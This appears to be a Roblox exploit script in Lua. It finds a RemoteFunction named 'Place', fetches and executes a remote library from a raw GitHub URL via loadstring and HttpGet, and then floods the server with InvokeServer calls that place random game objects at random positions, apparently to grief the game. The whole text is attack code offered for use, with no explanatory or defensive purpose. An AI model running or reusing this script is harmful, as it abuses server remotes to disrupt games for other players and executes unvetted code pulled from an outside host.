local radius = 100
function getInstance(name:string, instanceName:string)
    for _, even in game:GetDescendants() do
        if even.Name == name and even:IsA(instanceName) then
            return even
        end
    end
    return nil
end
local p = getInstance("Place", "RemoteFunction")
local gg = game:GetDescendants()

local github = 'https://raw.githubusercontent.com/system32unknown/'
local suffix = '/refs/heads/main/'
local RNG = loadstring(game:HttpGet(github .. 'Roblox' .. suffix .. 'RNG_LIB.lua'))()

for _, _ in gg do
    p:InvokeServer(unpack({
        [1] = {
            [1] = gg[math.random(0, #gg)],
            [2] = RNG.CFrame(radius, 360),
            [3] = gg[math.random(0, #gg)]
        }
    }))
end